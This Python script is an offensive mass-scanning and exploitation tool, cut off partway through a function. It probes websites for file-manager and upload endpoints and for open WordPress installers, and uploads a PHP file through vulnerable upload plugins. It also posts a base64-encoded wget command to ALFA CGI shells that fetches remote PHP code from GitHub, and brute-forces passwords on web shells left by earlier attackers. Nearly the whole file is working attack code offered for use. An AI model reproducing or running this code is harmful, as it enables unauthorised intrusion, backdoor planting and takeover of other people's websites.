import os,requests,random,threading,time,sys,ctypes,re,urllib3,rich
from functools import partial
from urllib.parse import parse_qs, urlparse
from urllib.parse import urljoin
from multiprocessing.dummy import Pool,Lock
from requests import post
from bs4 import BeautifulSoup
from random import choice
from colorama import Fore,Style,init
init(autoreset=True)

fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

def Folder(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
Folder('xploiter')
urllib3.disable_warnings()
dapet = 0
dir = [
      '/assets/filemanager/', '/assets/file-manager/',
	  '/assets/filemanagers/', '/assets/filemanager/dialog.php',
	   '/asset/filemanager/dialog.php', '/asset/filemanager/',
	   '/asset/file-manager/', '/asset/filemanagers/',
	   '/filemanager/', '/filemanager/dialog.php'
	   '/assets/admin/js/filemanager/', '/admin/assets/filemanager/',
	   '/dashboard/assets/filemanager/', '/media/filemanager/dialog.php',
	   '/assets/plugins/filemanager/dialog.php',
	   '/assets/admin/js/tinymce/plugins/filemanager/dialog.php',
	   '/plugins/filemanager/dialog.php',
	   '/plugins/filemanager/', '/filemanager/',
	   '/contents/filemanager/dialog.php',
	   '/templates/filemanager/dialog.php',
	   '/file-manager/dialog.php', '/fileman/dialog.php',
	   '/vendor/filemanager/dialog.php', '/api/vendor/filemanager/',
	   '/api/vendor/filemanager/dialog.php'
]
paths_filer = [
        "/admin/assets/plugins/jquery.filer/php/upload.php",
        "/admin/assets/plugin/jquery.filer/php/upload.php",
        "/admin/plugins/jquery.filer/php/upload.php",
        "/admin/plugin/jquery.filer/php/upload.php",
        "/plugin/jquery.filer/php/upload.php",
        "/plugins/jquery.filer/php/upload.php",
        "/blog/plugins/jquery.filer/php/upload.php",
        "/assets/plugins/jquery.filer/php/upload.php",
        "/asset/plugins/jquery.filer/php/upload.php",
        "/demo/plugins/jquery.filer/php/upload.php",
        "/demo/plugin/jquery.filer/php/upload.php",
        "/demo/assets/plugins/jquery.filer/php/upload.php",
        "/project/plugins/jquery.filer/php/upload.php"
]
jquery_paths = [
        "/admin/pages/Upload/",
		"/admin/assets/plugins/jquery-file-upload/",
		"/admin/assets/plugin/jquery-file-upload/",
		"/admin/asset/plugin/jquery-file-upload/",
		"/admin/asset/plugins/jquery-file-upload/",
		"/assets/plugins/jquery-file-upload",
		"/asset/plugins/jquery-file-upload",
		"/plugins/jquery-file-upload/",
		"/plugin/jquery-file-upload/",
		"/wp-content/plugins/work-the-flow-file-upload/public/assets/JQuery-File-Upload-9.5.0/server/php/",
		"/jQuery-File-Upload-9.22.0/server/php/",
		"/jquery-file-upload/server/php/",
		"/JQuery-File-Upload/server/php/",
		"/upload/server/php/",
		"/uploads/plugins/JQuery-File-Upload/server/php/",
		"/uploads/jquery-file-upload/server/php/",
		"/Uploads/JQuery-File-Upload/server/php/",
		"/Upload/jquery-file-upload/server/php/",
		"/assets/global/plugins/server/php/",
		"/assets/global/plugins/JQuery-File-Upload/server/php/",
		"/assets/global/plugins/jquery-file-upload/server/php/",
		"/assets/plugins/JQuery-File-Upload/server/php/",
		"/assets/plugins/jquery-file-upload/server/php/",
		"/assets/backend/js/JQuery-File-Upload/server/php/",
		"/js/assets/global/plugins/jquery-file-upload/server/php/",
		"/js/assets/plugins/JQuery-File-Upload/server/php/",
		"/yonetim/assets/global/plugins/jquery-file-upload/server/php/",
		"/yonetim/assets/plugins/JQuery-File-Upload/server/php/",
		"/system/phpforms/plugins/jquery-file-upload/server/php/",
		"/public/assets/global/plugins/JQuery-File-Upload/server/php/",
		"/public/assets/plugins/jquery-file-upload/server/php/",
		"/js/JQuery-File-Upload/server/php/",
		"/novo/admin/assets/jquery-file-upload/server/php/",
		"/assets/js-admin/plugins/JQuery-File-Upload/server/php/",
		"/__MACOSX/assets/plugins/jquery-file-upload/server/php/",
		"/blog/category/js/JQuery-File-Upload/server/php/",
		"/category/js/jquery-file-upload/server/php/",
		"/vendor/JQuery-File-Upload/server/php/",
		"/resources/theme/admin/plugins/jquery-file-upload/server/php/",
		"/app/assets/global/plugins/JQuery-File-Upload/server/php/",
		"/lib/jqueryplugins/jquery-file-upload/server/php/",
		"/WebUI/assets/plugins/JQuery-File-Upload/server/php/",
		"/Public/lib/metronic/assets/global/plugins/jquery-file-upload/server/php/",
		"/test/assets/plugins/JQuery-File-Upload/server/php/",
		"/update/UserControl/assets/jquery-file-upload/server/php/",
		"/site/assets/global/plugins/JQuery-File-Upload/server/php/",
		"/demo/assets/plugins/jquery-file-upload/server/php/",
		"/theme/assets/global/plugins/JQuery-File-Upload/server/php/",
		"/manager/assets/plugins/jquery-file-upload/server/php/",
		"/assets/super_admin/vendor/JQuery-File-Upload/server/php/",
		"/themes/dashboard/assets/plugins/jquery-file-upload/server/php/",
		"/blueimp-JQuery-File-Upload/server/php/",
		"/pixel/photobook/assets/jquery-file-upload/server/php/",
		"/support/vendor/JQuery-File-Upload/server/php/",
		"/extranet/assets/js/vendor/jquery-file-upload/server/php/",
		"/include/JQuery-File-Upload/server/php/",
		"/plugins/jquery-file-upload/server/php/",
		"/assets/frontend/plugins/JQuery-File-Upload/server/php/",
		"/php/upload/server/php/",
		"/public/site/jquery-file-upload/server/php/",
		"/intranet/assets/global/plugins/JQuery-File-Upload/server/php/",
		"/content/jquery-file-upload/server/php/",
		"/members/JQuery-File-Upload/server/php/",
		"/app/vendor/jquery-file-upload/server/php/",
		"/production/assets/plugins/JQuery-File-Upload/server/php/",
		"/web-files/global/plugins/jquery-file-upload/server/php/",
		"/clip-one/assets/plugins/JQuery-File-Upload/server/php/",
		"/js/plugins/jquery-file-upload/server/php/",
		"/Public/JQuery-File-Upload/server/php/",
		"/frontend/plugins/jquery-file-upload/server/php/",
		"/theme/vendors/JQuery-File-Upload/server/php/",
		"/css/assets/global/plugins/jquery-file-upload/server/php/",
		"/assets/plugins/JQuery-File-Upload/",
		"/jquery-file-upload/",
		"/plugins/JQuery-File-Upload/server/php/",
		"/assets/jquery-file-upload/server/php/",
		"/assets/js/JQuery-File-Upload/server/php/",
		"/javascript/jquery-file-upload/server/php/",
		"/js/JQuery-File-Upload/server/php/",
		"/public/assets/lib/jquery-file-upload/server/php/",
		"/public/js/JQuery-File-Upload/server/php/",
		"/public/plugins/jquery-file-upload/server/php/",
		"/static/vendor/JQuery-File-Upload/server/php/",
		"/scripts/jquery-file-upload/server/php/",
		"/public/JQuery-File-Upload/server/php/",
		"/assets/global/plugins/jquery-file-upload/server/php/",
		"/public/vendor/JQuery-File-Upload/server/php/",
		"/static/plugins/jquery-file-upload/server/php/",
		"/assets/vendor/JQuery-File-Upload/server/php/",
		"/cms/cms_js/jquery-file-upload/server/php/",
		"/vendor/JQuery-File-Upload/server/php/",
		"/static/jquery-file-upload/server/php/",
		"/static/js/JQuery-File-Upload/server/php/",
		"/core_web/javascript/jquery-file-upload/server/php/",
		"/core_web/javascript/JQuery-File-Upload/server/php/",
		"/dev/jquery-file-upload/server/php/",
		"/new/JQuery-File-Upload/server/php/",
		"/asset/global/plugins/jquery-file-upload/server/php/",
		"/asset/global/plugins/JQuery-File-Upload/server/php/",
		"/assets/global/plugins/jquery-file-upload/server/php/",
		"/assets/global/plugins/JQuery-File-Upload/server/php/",
     
]
user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/85.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]
file_name = "xploiter.php"
def writer(name, content):
	try:
		if content.strip() in open(name, "r").read():
			pass
		else:
			open(name, "a+").write(content.strip().replace("\n","")+"\n")
	except FileNotFoundError:
		open(name, "a+").write(content.strip().replace("\n","")+"\n")

def detect_protocol(domain):
    try:
        response = requests.head(f"https://{domain}", timeout=5)
        if response.status_code == 200:
            return "https"
    except requests.RequestException:
        pass
    return "http"
def log_message(status, domain, message, color):
    print(f"{color}[{status}]{fw} {domain} >> {message}")
def write_to_file(filename, content):
    try:
        with open(filename, "a") as f:
            f.write(content + "\n")
    except Exception as e:
        print(f"{fr}[ERROR] Tidak dapat menulis ke file: {e}")
def alfa(i) :
    global dapet
    x = requests.session()
    head={
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    }
    nomi = ['/alfacgiapi','/ALFA_DATA/alfacgiapi','/assets/alfacgiapi','/assets/ALFA_DATA/alfacgiapi','/upload/alfacgiapi','/upload/ALFA_DATA/alfacgiapi','/uploads/alfacgiapi','/uploads/ALFA_DATA/alfacgiapi','/assets/upload/alfacgiapi','/assets/upload/ALFA_DATA/alfacgiapi','/assets/uploads/alfacgiapi','/assets/uploads/ALFA_DATA/alfacgiapi','/wp-content/alfacgiapi','/wp-content/ALFA_DATA/alfacgiapi''/wp-content/uploads/alfacgiapi','/wp-content/uploads/ALFA_DATA/alfacgiapi','/wp-content/plugins/alfacgiapi','/wp-content/plugins/ALFA_DATA/alfacgiapi','/wp-content/themes/alfacgiapi','/wp-content/themes/ALFA_DATA/alfacgiapi','/wp-content/upgrade/alfacgiapi','/wp-content/upgrade/ALFA_DATA/alfacgiapi','/wp-content/updraft/alfacgiapi','/wp-content/updraft/ALFA_DATA/alfacgiapi','/wp-content/plugins/library/alfacgiapi','/wp-content/plugins/library/ALFA_DATA/alfacgiapi','/wp-admin/alfacgiapi','/wp-admin/ALFA_DATA/alfacgiapi','/wp-includes/alfacgiapi','/wp-includes/ALFA_DATA/alfacgiapi','/.well-known/alfacgiapi','/.well-known/ALFA_DATA/alfacgiapi','/.well-known/acme-challenge/alfacgiapi','/.well-known/acme-challenge/ALFA_DATA/alfacgiapi','/.well-known/pki-validation/alfacgiapi','/.well-known/pki-validation/ALFA_DATA/alfacgiapi','/.tmb/alfacgiapi','/.tmb/ALFA_DATA/alfacgiapi','/.quarantine/alfacgiapi','/.quarantine/ALFA_DATA/alfacgiapi','/cgi-bin/alfacgiapi','/cgi-bin/ALFA_DATA/alfacgiapi','/images/alfacgiapi','/images/ALFA_DATA/alfacgiapi','/components/alfacgiapi','/components/ALFA_DATA/alfacgiapi','/wordpress/alfacgiapi','/wordpress/ALFA_DATA/alfacgiapi','/wp/alfacgiapi','/wp/ALFA_DATA/alfacgiapi','/blog/alfacgiapi','/blog/ALFA_DATA/alfacgiapi','/new/alfacgiapi','/new/ALFA_DATA/alfacgiapi','/old/alfacgiapi','/old/ALFA_DATA/alfacgiapi','/backup/alfacgiapi','/backup/ALFA_DATA/alfacgiapi']
    for eclipsec in nomi :
        try :
            url = ("http://"+i+eclipsec+"/perl.alfa")
            url2 = ("http://"+i+eclipsec+"/bash.alfa")
            url3 = ("http://"+i+eclipsec+"/py.alfa")
            check = ("http://"+i+eclipsec+"/index.php?nm=nomi")
            check2 = ("http://"+i+eclipsec+"/index.php?nm=nomi")
            check3 = ("http://"+i+eclipsec+"/index.php?nm=nomi")
            x.post(url, headers=head, data={'cmd': 'd2dldCAtcU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9lY2xpYmVzZWMvdXBsb2FkZXIvcmVmcy9oZWFkcy9tYWluL2luZGV4LnBocA=='}, timeout=15)
            x.post(url, headers=head, data={'cmd': 'd2dldCAtcU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9lY2xpYmVzZWMvdXBsb2FkZXIvcmVmcy9oZWFkcy9tYWluL2luZGV4LnBocA=='}, timeout=15)
            x.post(url2, headers=head, data={'cmd': 'd2dldCAtcU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9lY2xpYmVzZWMvdXBsb2FkZXIvcmVmcy9oZWFkcy9tYWluL2luZGV4LnBocA=='}, timeout=15)
            x.post(url2, headers=head, data={'cmd': 'd2dldCAtcU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9lY2xpYmVzZWMvdXBsb2FkZXIvcmVmcy9oZWFkcy9tYWluL2luZGV4LnBocA=='}, timeout=15)
            x.post(url3, headers=head, data={'cmd': 'd2dldCAtcU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9lY2xpYmVzZWMvdXBsb2FkZXIvcmVmcy9oZWFkcy9tYWluL2luZGV4LnBocA=='}, timeout=15)
            x.post(url3, headers=head, data={'cmd': 'd2dldCAtcU8gaW5kZXgucGhwIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9lY2xpYmVzZWMvdXBsb2FkZXIvcmVmcy9oZWFkcy9tYWluL2luZGV4LnBocA=='}, timeout=15)
            req1 = x.get(check, headers=head, timeout=15)
            if "NowMeeee" in req1.text :
                dapet = dapet + 1
                print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found ALFA RCE")
                open("xploiter/shell.txt","a").write(check+"\n")
                break
            req2 = x.get(check2, headers=head, timeout=15)
            if "NowMeeee" in req2.text :
                dapet = dapet + 1
                print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found ALFA RCE")
                open("xploiter/shell.txt","a").write(check2+"\n")
                break
            req3 = x.get(check3, headers=head, timeout=15)
            if "NowMeee" in req3.text :
                dapet = dapet + 1
                print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found ALFA RCE")
                open("xploiter/shell.txt","a").write(check3+"\n")
                break
            else :
                print(fw+"["+fy+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fr+" Not Found ALFA RCE")
        except :
            pass
def kcfinder(url, dir):
	global header
	url = ["http://"+e for e in re.findall(r"(?:(?:https?://)?(?:www\d?\.)?|www\d?\.)?([^\s/]+)", url)][0]
	for x in dir:
		xpl = url + "/" + x
		try:
			cek = x.get(xpl, headers=header(), timeout=10).text
			if "Resources Browser" in str(cek) or "frmUploadWorker" in str(cek) or "frmActualFolder" in str(cek) or "alert('Unknown error')" in str(cek):
				writer("xploiter/ckeditor.txt", xpl)
				print(fw+"["+fg+"scaning"+fw+"] "+fw+url+" "+fw+">>"+fg+" Found KCfinder")
				break
			else:
				print(fw+"["+fy+"scaning"+fw+"] "+fw+url+" "+fw+">>"+fr+" Not Found KCfinder")
		except:
			pass
			break
def roxy(i) :
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    nomi = ['/assets/editor/fileman/dev.html','/assets/editor/fileman/index.html','/js/fileman/dev.html','/js/fileman/index.html','/fileman/index.html','/fileman/dev.html','/lib/fileman/index.html','/lib/fileman/dev.html','/admin/fileman/index.html','/admin/fileman/dev.html']
    for eclipsec in nomi :
        try :
            url = ("http://"+i+eclipsec)
            r = x.get(url, headers=head, timeout=15, verify=False)
            if "Roxy file manager" in r.text :
                print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found RFM")
                open("xploiter/RFM.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fy+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fr+" Not Found RFM")
        except :
            pass
def wpins(i) :
    x = requests.session()
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    nomi = ['/wp-admin/install.php','/wp/wp-admin/install.php','/wordpress/wp-admin/install.php','/blog/wp-admin/install.php','/new/wp-admin/install.php','/test/wp-admin/install.php','/old/wp-admin/install.php','/backup/wp-admin/install.php']
    for eclipsec in nomi :
        try :
            url = ("http://"+i+eclipsec)
            req = x.get(url, headers=head)
            if "<title>WordPress &rsaquo; Setup Configuration File</title>" in req.text and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req.text :
                print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found WpSetup")
                open("xploiter/WpSetUp.txt","a").write(url+"\n")
                break
            elif "<title>WordPress &rsaquo; Installation</title>" in req.text and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req.text :
                print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found WpInstall")
                open("xploiter/WpInstall.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fy+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fr+" Not Found WPI/WPS")
        except :
            pass
def jquery_filer(target):
    global dapet
    x = requests.session()
    headers = {
        'User-Agent': random.choice(user_agents)
    }
    test_file_path = "xploiter.php"
    output_dir = "xploiter"
    if not os.path.exists(test_file_path):
        return
    os.makedirs(output_dir, exist_ok=True)

    files = {
        'files[]': (os.path.basename(test_file_path), open(test_file_path, 'rb'), 'application/octet-stream')
    }
    upload_successful = False
    for path in paths_filer:
        full_url = f"http://{target}{path}"
        try:
            response = x.get(full_url, headers=headers, timeout=10, allow_redirects=True, verify=False)
            if response.status_code == 200 and not response.text.strip():
                upload_response = x.post(full_url, headers=headers, files=files, timeout=10, allow_redirects=True, verify=False)
                if upload_response.status_code == 200 and "files" in upload_response.text:
                    uploaded_filename = None
                    for line in upload_response.text.split("\n"):
                        if "[0] => ../uploads/" in line:
                            uploaded_filename = line.split("[0] => ../uploads/")[1].strip().replace(")", "")
                            break
                    if uploaded_filename:
                        upload_path = path.replace("/php/upload.php", "/uploads/")
                        uploaded_file_url = f"http://{target}{upload_path}{uploaded_filename}"
                        check_response = x.get(uploaded_file_url, headers=headers, timeout=10)
                        if check_response.status_code == 200 and "NowMeee" in uploaded_file_url:
                            with open(os.path.join(output_dir, "jquery_filer_uploaded.txt"), "a") as uploaded_file:
                                uploaded_file.write(f"{uploaded_file_url}\n")
                            dapet += 1
                            upload_successful = True
                            break
                        else:
                            with open(os.path.join(output_dir, "jquery_filer_manual.txt"), "a") as manual_file:
                                manual_file.write(f"{uploaded_file_url}\n")
        except requests.exceptions.RequestException:
            continue

        if upload_successful:
            break
def jquery_file_uplaod(domain, file_name="xploiter.php", bot_token=None, chat_id=None):
    protocol = detect_protocol(domain)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
    }
    if not os.path.exists(file_name):
        return
    for path in jquery_paths:
        url = f"{domain}"
        log_message("SCANNING", domain, url, fy)
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if "jQuery File Upload" in response.text:
                log_message("VULNERABLE", domain, f"Found: {url}", fg)
                write_to_file("vuln_jquery.txt", url)
                upload_url = urljoin(url, "server/php/")
                files = {
                    "files[]": (os.path.basename(file_name), open(file_name, "rb"), "application/octet-stream")
                }
                try:
                    upload_response = requests.post(upload_url, files=files, timeout=5)
                    if upload_response.status_code == 200 and "files" in upload_response.text:
                        uploaded_url = urljoin(upload_url, f"files/{os.path.basename(file_name)}")
                        log_message("SUCCESS", domain, f"Uploaded: {uploaded_url}", fg)
                        write_to_file("jquery_uploaded.txt", uploaded_url)                           
                except:
                    pass 
            else:
                pass
        except:
            pass
def xploiter(i) :
    global dapet
    x = requests.session()
    head = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0', 
    'Upgrade-Insecure-Requests': '1',     
    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
    'Accept-Encoding': 'gzip, deflate', 
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 
    'referer': 'www.google.com'
    }
    try :
        nomi = ['un.php','foxx.php','wawe.php','js.php?get','phpinfo.php?re@=vo@','wp-email.php','wp-booking.php','fierza.php','load.php','wp-content/themes/fitnessbase/dev.php','wp-content/themes/fitnessbase/crp.php','alpha.php','tinyfilemanager.php','filemanager.php','manager.php','wp-content.php','wp-content/themes/alera/alpha.php','wp-content/plugins/wp-diambar/includes/loadme.php','lock360.php?daksldlkdsadas=1','5.php','01.php','.well-known/pki-validation/wp-signup.php','.well-known/wp-signup.php','jindex.php','0o.php','ciis.php','zfox.php','zf.php','room.php','xd.php','adriv.php','gecko.php','tonant.php','b.php','xleet-shell.php','4mosan.php','cong.php','config.php','wp-key.php','wp-conctent.php','flame.php','wp-content/flame.php','block-patwp.php','bre.php','lx.php','991176.php','ffAA531.php','wp-help.php','un.php?f=f','un2.php?f=f','wp-posts.php','xl.php','ww.php','testwp.php?wp=1','kyami.php','wp-includes/class-wp-other.php','unknown.php','1975.phP','Mo2AaAaAaPrivateShell.php','god4m.php','tuco.php','x.php','w.php','shl.php','wp-class.php','info.php','o.php','shx.php','l.php','hi.php','readme.php','pi.php','wp-content/themes/noriumportfolio/img_screen.php','wp-content/themes/noriumportfolio/doc.php','wp-content/themes/noriumportfolio/alpha.php','wp-content/themes/noriumportfolio/db.php?u','wp-content/themes/seotheme/db.php?u','wp-content/themes/seotheme/mar.php','wp-content/themes/skatepark/alpha.php','wp-content/themes/skatepark/img_screen.php','wp-content/themes/skatepark/db.php?u','wp-content/themes/skatepark/doc.php','wp-content/plugins/db/mar.php','wp-content/themes/wp-pridmag/22x.php','wp-content/plugins/ndak/1.php','wp-content/plugins/ndak/marijuana.php','wp-content/themes/workart/db.php?u','wp-content/plugins/cakil/up.php','wp-content/plugins/cache-wordpress/wp-activates.php','wp-content/plugins/cache-wordpress/payment.php','wp-content/plugins/cekidot/readme.txt','wp-content/plugins/cekidot/mar.php','wp-content/themes/workart/doc.php','wp-content/themes/theme/gr.php','wp-content/themes/pridmag/init.php','wp-content/themes/jobart/db.php?u','wp-content/themes/jobart/doc.php','wp-content/themes/cepair/doc.php','wp-content/themes/cakiltheme/up.php','wp-content/themes/cakiltheme/idx.php','wp-content/themes/wp-pridmag/status.php','wp-content/themes/wp-pridmag/up.php','wp-content/themes/wp-pridmag/init.php','wp-content/themes/rishi/doc.php','wp-content/plugins/linkpreview/db.php?u','wp-content/themes/rishi/db.php?u','wp-content/plugins/virr/v.php','wp-content/themes/pridmag/db.php?u','wp-content/plugins/virr/uploader.php?uploader','wp-content/plugins/db/uploader.php?uploader','wp-content/plugins/wp-freeform/wawe.php','wp-content/plugins/wp-freeform/includes/loadme.php','wp-content/plugins/wp-freeform/style.php','?loadme','galekjaya.php?raimu=tgl99','r00t.php','Xzd.php','radio.php?pass=shell','content.php','about.php','admin.php','css.php','doc.php','wp_wrong_datlib.php','v.php','ups.php','up.php','fw.php','loader/ff.php?pass=shell','local.php','wp-atom.php','1index.php?pass=shell','2index.php?pass=shell','3index.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','wikindex.php?f=NmRtJOUjAdutReQjscRjKUhleBpzmTyO.txt','autoload_classmap.php','wp-conflg.php','wp-admin/includes/1975.php','wp-backup-sql-302.php','wp-includes/wp-class.php','wp-inlcudes.php?katib','wp-js.php?phpshells','wp-load.php?daksldlkdsadas=1','sys.php','0.php','0byte.php','0x0.php','0z.php','1.php','13.php','1877.php','1975.php?CVE=2022','1975.php?CVE=2021','1975.php','1975Team.php?shell=Dead','403.php','404.php','45.php','4x4.php','73.php','a.php','abc.php','al.php','alf.php','alf4.php','alfa-ioxi.php','alfa-shell-v4.php','alfa.php','alfakun.php','alfatesla.php','alfateslav4.php','alwso.php','anjay.php','anon.php','anons79.php','base.php','batm.php','bj.php','black.php','blog/wp-includes/fonts/dev.php','blog/wp-includes/fonts/iqb.php','by.php','byp.php','bypas.php','bypass.php','byps.php','c.php','ccaef.php','chitoge.php','codeboy1877x.php','con.php','con7.php','con7ext.php','dbx.php','defau1t.php','degeselih.php','dev.php','docindex.php','dosya.php','Dz.php','e.php','error.php?phpshells','evil.php','file.php','fox.php','FoxWSO-full.php','FoxWSO.php','foxwso.php','gank.php','gank.php.PhP','gel4y.php','gelay.php','gh.php','hehe.php','i.php','id.php','ids.php','idx.php','indoxploit.php','init.php','ioxi.php','iq.php','iqb.php','k.php','kepo.php','kk.php','kndw1.php','la.php','lnedx.php','lol.php','lolzk.php','m.php','mar.php','marijuana.php','mas.php','mass.php','mclash.php','mi.php','min.php','mini.php','minik.php','minishell.php','mrjn.php','n.php','new-index.php','ninja.php','ohayo.php','old-index.php?daksldlkdsadas=1','olux.php','postfs.php','pref.php','priv.php','priv8.php','qindex.php','r.php','r57.php','rex.php','root.php','s.php','shell.php','shell20211028.php','shells.php','sql.php','srx.php','sym.php','sym403.php','t.php','tes.php','tesla.php','teslav.php','test.php','tshop.php','twin.php','u.php','upload.php','uploader.php','usb.php','usr.php','utchiha.phP','v3.php','v4.php','vuln.php','w3llstore.php','wp-2019.php','wp-admin.php','wp-content/mu-plugins-old/index.php','wp-content/themes/twentytwentytwo/index.php','wp-defaul.php','wp-includes/fonts/dev.php','wp-includes/fonts/iq.php','wp-includes/fonts/iqb.php','wp-info.php','wp-mails.php','wp-one.php','wp-pluging.php','wp-plugins.php','wp-rss.php','wp-singupp.php','wp-site.php','wp-system.php','wp-title.php','wp-we.php','wp.php','wp/wp-includes/fonts/dev.php','wp/wp-includes/fonts/iqb.php','wpindex.php','ws.php','wsanon.php','WSO.php','wso.php','wso1.php','wso1337.php','wso2.php','xcv.php','xidcm.php','xindex.php','xleet.php','xm.php','xx.php','XxX.php','xxx.php','y.php','z.php','zk.php','zone.php?phpshell','zx.php','symlink.php','c99.php','ok.php','2.php','3.php','4.php','6.php','7.php','8.php','9.php','10.php','p.php','q.php','d.php','f.php','g.php','h.php','j.php','wp-wso.php','minimo.php','V3.php','V5.php','www.php','100.php','777.php','eclipsec.php','new.php','wi.php','nee.php','87.php','haxor.php','FoxWSOv1.php','bb.php','lf.php','hello.php','if.php','kn.php','3301.php','anone.php','wp-configer.php','wp-ad.php','send.php','.wp-cache.php','sendmail.php','rahma.php','nasgor.php','alfa123.php']
        for eclipsec in nomi :
            url = ("http://"+i+"/"+eclipsec)
            url2 = ("https://"+i+"/"+eclipsec)
            req = x.get(url, headers=head, timeout=7, verify=False).text
            req = x.get(url2, headers=head, timeout=7, verify=False).text
            if "border:none;background-color:#1e252e;color:#fff;cursor:pointer;" in req or "name='watching' value='submit'" in req or "name='watching' value='>>'" in req or "<form method=post><input type=password name=pass>" in req or "<input type=password name=pass><input type=submit" in req or "method=post>Password:" in req :
                print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found Shell")
                
                open("xploiter/shellpw.txt","a").write(url+"\n")
                listpw = ['admin','stusa','xleet','x505','damedesuyo8800','am*guAW8.ryDgz-TYF','Stusa','friv','fuck666','','****','*****','Haxor?1337','haxor','Haxor','imunify1337','Malyo1@8','31337','00w1wcRT','022627raflixsec','123','123456','12qwaszx','1337','133721','1n73ction','22XC','404','555','731','a5e8z77','abcder','achan','adminhoki','aerul','akudimana','alfa','anggie21','AnonGhost','AnonymousFox','asdsdggenu','awokawok2','b374k','b3t4kun','BangPat?1337','banyumas','bheart2206','cantik','cmonqwe123#@!','con7extshell','cyb3r','DapsquaD','DeadSec','default','elena','fff132f70f28194','G00DV1N','geronimo123','gfus','ghost287','HACKED','hacker0882','hackmeDON','Hasilhoki','haurgeulis','haxor34','huypizdaprovoda','hxr1337','iamtheking','IndexAttacker','IndoSec','IndoXploit','JH23FVDG32FD','jupiter2709','katib','kem','kontolcokasu','kontolgaceng','kontoll471','kpxwbYBP4hQK','l o l','leksak98@','letmeinmobile','mad','memes','mini-shell','Mo2a0123','mravast','myrepublic','oppaidragon','password','peler','peler666','Penolong40','phpshell','phpshells','pucek12345','r00t','r00tsh3ll','rbbd95','RFkyy','root','root@kudajumping','Sandra@1199','sys123','T1KUS90T','tbl','thopik123','tunafeesh','w0rms','xmina','zaza','zeeblaxx','{ IndoSec }']
                for pw in listpw :
                    tor = ("http://"+i+"/"+eclipsec+"#"+pw)
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': '>>'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': '>>'}, timeout=7, verify=False).text
                    if "-rw-r--r--" in cek or ">File manager<" in cek or ">Upload file:" in cek or "drwxr-xr-x" in cek or "-rw-rw-rw-" in cek or "drwxrwxrwx" in cek or "Upload File :" in cek or "Writeable" in cek :
